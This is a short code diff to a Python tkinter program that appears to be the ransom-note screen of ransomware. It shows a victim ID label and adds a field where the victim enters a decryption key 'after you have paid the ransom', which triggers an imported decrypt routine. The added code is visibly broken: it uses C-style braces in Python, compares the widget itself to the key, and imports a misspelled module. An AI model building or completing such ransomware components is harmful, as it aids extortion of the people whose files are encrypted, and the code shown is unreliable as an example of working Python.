@@ -7,6 +7,8 @@ import tkinter as tk
 import ctypes
 import pygame
 import os
+from encypt import key 
+from decrypt import decrypt
 
 
 """
@@ -125,4 +127,29 @@ victim_id_label = tk.Label(
 )
 victim_id_label.pack(side="top", pady=10)
 
+# DECRYPT INPUT USER ENTRYTO FERNET KEY
+
+user_entry_label = tk.Label(
+    window,
+    text=f"After you have paid the ransom, enter the key here :",
+    fg="red",
+    bg="#000000", 
+    font=("Georgia", 14),
+    pady=15,
+    width=60,
+    relief="sunken", 
+    borderwidth=1
+)
+user_entry = tk.Entry(root, width=80)
+user_entry.pack(pady=10)
+if(user_entry == key){
+ decrypt()
+}else{
+    messagebox.showerror(
+    title="THAT WASN'T THE KEY!!!",
+    message="THAT WASN'T THE KEY!!!",
+    detail="THAT WASN'T THE KEY!!!",
+    icon='error'
+)
+}
 window.mainloop()
